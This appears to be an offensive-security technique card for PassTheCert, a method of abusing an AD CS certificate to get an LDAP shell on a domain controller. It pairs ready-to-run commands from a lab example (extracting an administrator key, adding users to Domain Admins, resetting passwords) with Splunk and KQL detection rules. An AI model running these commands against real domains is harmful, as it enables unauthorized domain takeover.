name: PassTheCert (Certificate-Based LDAP Shell)
description: When you have a certificate (PFX/CRT+KEY) but PKINIT authentication fails (e.g. the cert lacks Client Authentication EKU, or the KDC rejects it), PassTheCert authenticates to LDAP using the certificate via Schannel/LDAPS. This gives you an interactive LDAP shell where you can add users to groups, reset passwords, or perform any LDAP operation as the certificate's identity.
notes:
=== THE IDEA ===
PKINIT (Kerberos) requires the cert to have Client Authentication EKU.
If it only has Server Authentication (e.g. from ESC15/WebServer template),
certipy-ad auth will fail. PassTheCert bypasses this by authenticating
to LDAP over TLS (Schannel) where EKU is not enforced the same way.

=== SPLIT PFX INTO CRT + KEY ===
  certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
  certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key

=== LAUNCH LDAP SHELL ===
  python3 passthecert.py -action ldap-shell \
    -crt administrator.crt -key administrator.key \
    -domain <domain> -dc-ip <dc_ip>

=== LDAP SHELL COMMANDS ===
  add_user_to_group <user> Administrators
  add_user_to_group <user> 'Domain Admins'
  set_password <user> <new_password>
  add_computer <computer_name>
  del_computer <computer_name>

=== ALTERNATIVE ACTIONS ===
  -action modify-user  (set a UPN for S4U2Self)
  -action add-computer (add a machine account)
  -action whoami       (verify the authenticated identity)

=== INSTALL ===
  git clone https://github.com/AlmondOffSec/PassTheCert.git
  cd PassTheCert/Python

examples.label: Split PFX into cert and key
examples.command: certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt && certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key

examples.label: LDAP shell with certificate
examples.command: python3 passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain tombwatcher.htb -dc-ip 10.129.232.167

examples.label: Add user to Domain Admins via LDAP shell

recommended.note: ESC15 gets you the certificate; PassTheCert uses it when PKINIT fails.
certipy-ad cert splits the PFX; certipy-ad auth is the first attempt before falling back to PassTheCert.

defense.why_it_works: Schannel (TLS client certificate authentication to LDAP) does not enforce EKU restrictions the same way PKINIT does. A certificate with only Server Authentication EKU can still authenticate to LDAPS, granting the attacker an LDAP session as the certificate's subject.
defense.prerequisites: A valid certificate (PFX or CRT+KEY) issued by the domain's CA, even without Client Authentication EKU; LDAPS must be available (port 636).
defense.impact: Authenticated LDAP session as the certificate's identity - can modify group membership, reset passwords, add computers.
defense.detection: [MITRE T1649] LDAPS connection using certificate authentication (Event 4624 with AuthPackage=Schannel); Group membership changes (4728/4756) shortly after.
defense.artifacts: 4624 Schannel logon event; 4728/4756 group membership changes; CRT and KEY files on attacker disk.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4624 AuthenticationPackageName="Schannel"
| table _time, TargetUserName, IpAddress, CertificateIssuerName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4624 and AuthenticationPackageName == "Schannel"
| project TimeGenerated, Account=TargetUserName, IpAddress, CertIssuer=CertificateIssuerName
defense.prevention: Disable LDAPS if not required; monitor Schannel logon events; require Client Authentication EKU in all user-facing templates; patch vulnerable templates.

detections.name: Schannel certificate authentication to LDAP
detections.logic:
SecurityEvent
| where EventID == 4624 and AuthenticationPackageName == "Schannel"
| project TimeGenerated, Account=TargetUserName, IpAddress, CertIssuer=CertificateIssuerName
| join kind=leftouter (
    SecurityEvent | where EventID in (4728, 4756)
    | project GroupChangeTime=TimeGenerated, GroupName=TargetUserName, MemberAdded=MemberName
) on $left.Account == $right.MemberAdded
| sort by TimeGenerated desc
detections.false_positives: Legitimate smart card or certificate-based LDAP authentication
detections.tuning: Alert when Schannel logon is followed by privileged group modification within 5 minutes
